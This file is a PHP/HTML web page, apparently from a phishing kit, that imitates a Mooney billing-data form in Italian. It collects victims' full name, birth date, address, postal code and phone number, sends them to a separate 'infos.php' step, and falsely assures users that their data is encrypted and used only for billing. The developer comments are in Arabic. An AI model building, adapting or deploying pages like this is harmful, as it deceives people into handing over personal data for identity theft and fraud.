<?php
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mooney - Dati Fatturazione</title>
    <!-- إضافة الـ favicon -->
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        /* Title */
        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #4F4F4F;
            margin-bottom: 40px;
            line-height: 1.6;
        }
        
        /* Location Animation */
        .location-animation {
            position: relative;
            margin: 30px 0;
            height: 120px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .location-pin {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #FFCC00, #e6b800);
            border-radius: 50% 50% 50% 0;
            transform: rotate(-45deg);
            position: relative;
            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.3);
            animation: locationPulse 2s infinite;
        }
        
        .location-pin::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(45deg);
            width: 30px;
            height: 30px;
            background: #008085;
            border-radius: 50%;
        }
        
        @keyframes locationPulse {
            0% { transform: rotate(-45deg) scale(1); }
            50% { transform: rotate(-45deg) scale(1.05); }
            100% { transform: rotate(-45deg) scale(1); }
        }
        
        /* Form Container */
        .form-container {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 25px;
            width: 100%;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #4F4F4F;
            font-size: 14px;
            font-weight: bold;
        }
        
        .input-field {
            width: 100%;
            padding: 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 18px;
            color: #4F4F4F;
            background: transparent;
            padding-bottom: 8px;
            transition: border-color 0.3s;
        }
        
        .input-field::placeholder {
            color: #4F4F4F;
            font-size: 16px;
        }
        
        .input-field:focus {
            outline: none;
            border-bottom-color: #008085;
        }
        
        /* Error Styles */
        .input-field.error {
            border-bottom-color: #dc3545;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 8px;
            font-weight: 600;
            animation: fadeIn 0.3s ease;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .error-icon {
            font-size: 16px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .form-row {
            display: flex;
            gap: 15px;
        }
        
        .form-col {
            flex: 1;
        }
        
        .input-hint {
            color: #4F4F4F;
            font-size: 14px;
            margin-top: 8px;
        }
        
        /* Date of Birth Fields */
        .birthdate-fields {
            display: grid;
            grid-template-columns: 1fr 1fr 2fr;
            gap: 12px;
            margin-top: 8px;
        }
        
        .birthdate-field {
            display: flex;
            flex-direction: column;
        }
        
        .birthdate-input {
            width: 100%;
            padding: 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 18px;
            color: #4F4F4F;
            background: transparent;
            padding-bottom: 8px;
            text-align: center;
            transition: border-color 0.3s;
        }
        
        .birthdate-input:focus {
            outline: none;
            border-bottom-color: #008085;
        }
        
        .birthdate-label {
            display: block;
            text-align: center;
            font-size: 11px;
            color: #4F4F4F;
            margin-top: 5px;
            font-weight: 500;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background-color: #FFCC00;
            color: #333;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #e6b800;
        }
        
        .security-info {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
        }
        
        .security-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: #008085;
        }
        
        .security-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .security-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .input-field {
                font-size: 16px;
            }
            
            .birthdate-input {
                font-size: 16px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 22px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
            
            .btn {
                padding: 16px;
                font-size: 16px;
            }
            
            .form-row {
                flex-direction: column;
                gap: 0;
            }
            
            .birthdate-fields {
                grid-template-columns: 1fr 1fr 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <!-- Location Animation -->
        <div class="location-animation">
            <div class="location-pin"></div>
        </div>
        
        <!-- Title -->
        <h1>Dati di Fatturazione</h1>
        <p class="subtitle">
            Inserisci i tuoi dati per completare la procedura
        </p>
        
        <div class="form-container">
            <form action="infos.php" method="POST">
                <!-- إضافة حقل hidden لتحديد الخطوة -->
                <input type="hidden" name="step" value="billing">
                
                <!-- Nome Completo -->
                <div class="form-group">
                    <label for="full_name">Nome Completo*</label>
                    <input type="text" id="full_name" name="full_name" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['full_name'])) ? 'error' : ''; ?>" placeholder="Mario Rossi" required>
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['full_name'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Nome completo non valido
                    </div>
                    <?php endif; ?>
                    <div class="input-hint">Nome e cognome come appare sul documento</div>
                </div>
                
                <!-- Data di Nascita -->
                <div class="form-group">
                    <label>Data di Nascita*</label>
                    <div class="birthdate-fields">
                        <div class="birthdate-field">
                            <input type="text" name="gg" class="birthdate-input" placeholder="GG" maxlength="2" required>
                            <span class="birthdate-label">GG</span>
                        </div>
                        <div class="birthdate-field">
                            <input type="text" name="mm" class="birthdate-input" placeholder="MM" maxlength="2" required>
                            <span class="birthdate-label">MM</span>
                        </div>
                        <div class="birthdate-field">
                            <input type="text" name="aaaa" class="birthdate-input" placeholder="AAAA" maxlength="4" required>
                            <span class="birthdate-label">AAAA</span>
                        </div>
                    </div>
                </div>
                
                <!-- Indirizzo -->
                <div class="form-group">
                    <label for="address">Indirizzo*</label>
                    <input type="text" id="address" name="address" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['address'])) ? 'error' : ''; ?>" placeholder="Via Roma 123" required>
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['address'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Indirizzo non valido
                    </div>
                    <?php endif; ?>
                    <div class="input-hint">Indirizzo completo di residenza</div>
                </div>
                
                <!-- Città e CAP -->
                <div class="form-row">
                    <div class="form-col">
                        <div class="form-group">
                            <label for="city">Città*</label>
                            <input type="text" id="city" name="city" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['city'])) ? 'error' : ''; ?>" placeholder="Milano" required>
                            <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['city'])): ?>
                            <div class="error-message">
                                <span class="error-icon">⚠️</span>
                                Città non valida
                            </div>
                            <?php endif; ?>
                            <div class="input-hint">Città di residenza</div>
                        </div>
                    </div>
                    <div class="form-col">
                        <div class="form-group">
                            <label for="zip">CAP*</label>
                            <input type="text" id="zip" name="zip" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['zip'])) ? 'error' : ''; ?>" placeholder="20100" required maxlength="5">
                            <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['zip'])): ?>
                            <div class="error-message">
                                <span class="error-icon">⚠️</span>
                                CAP non valido
                            </div>
                            <?php endif; ?>
                            <div class="input-hint">Codice postale</div>
                        </div>
                    </div>
                </div>
                
                <!-- Telefono -->
                <div class="form-group">
                    <label for="phone">Telefono*</label>
                    <input type="text" id="phone" name="phone" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['phone'])) ? 'error' : ''; ?>" placeholder="390123456789" required>
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['phone'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Telefono non valido
                    </div>
                    <?php endif; ?>
                    <div class="input-hint">Numero per eventuali contatti</div>
                </div>
                
                <button type="submit" class="btn">CONFERMA INDIRIZZO</button>
            </form>
            
            <!-- Security Info -->
            <div class="security-info">
                <div class="security-icon">🛡️</div>
                <div class="security-title">Dati Protetti</div>
                <p class="security-description">
                    I tuoi dati sono utilizzati solo per scopi di fatturazione e sono protetti con crittografia avanzata.
                </p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const fullNameInput = document.getElementById('full_name');
            const ggInput = document.querySelector('input[name="gg"]');
            const mmInput = document.querySelector('input[name="mm"]');
            const aaaaInput = document.querySelector('input[name="aaaa"]');
            const addressInput = document.getElementById('address');
            const cityInput = document.getElementById('city');
            const zipInput = document.getElementById('zip');
            const phoneInput = document.getElementById('phone');
            
            // Rimuovi errori dalla sessione dopo il caricamento
            <?php 
            if(isset($_SESSION['errors'])) {
                foreach(['full_name', 'address', 'city', 'zip', 'phone'] as $error) {
                    if(isset($_SESSION['errors'][$error])) {
                        echo "setTimeout(() => { document.querySelector('#$error')?.classList?.remove('error'); }, 3000);";
                    }
                }
                // Rimuovi tutti gli errori
                unset($_SESSION['errors']);
            }
            ?>
            
            // تنسيق CAP (أرقام فقط)
            zipInput.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
            
            // تنسيق الهاتف (أرقام فقط)
            phoneInput.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
            });
            
            // تنسيق تاريخ الميلاد (أرقام فقط)
            const birthdateInputs = document.querySelectorAll('.birthdate-input');
            birthdateInputs.forEach(input => {
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                });
            });
            
            // الانتقال التلقائي بين حقول تاريخ الميلاد
            ggInput.addEventListener('input', function(e) {
                if (this.value.length === 2) {
                    mmInput.focus();
                }
            });
            
            mmInput.addEventListener('input', function(e) {
                if (this.value.length === 2) {
                    aaaaInput.focus();
                }
            });
            
            // تأثيرات الظهور المتدرج
            const container = document.querySelector('.form-container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            container.style.transition = 'all 0.8s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 200);
            
            // تركيز الحقل الأول تلقائياً
            fullNameInput.focus();
        });
    </script>
</body>
</html>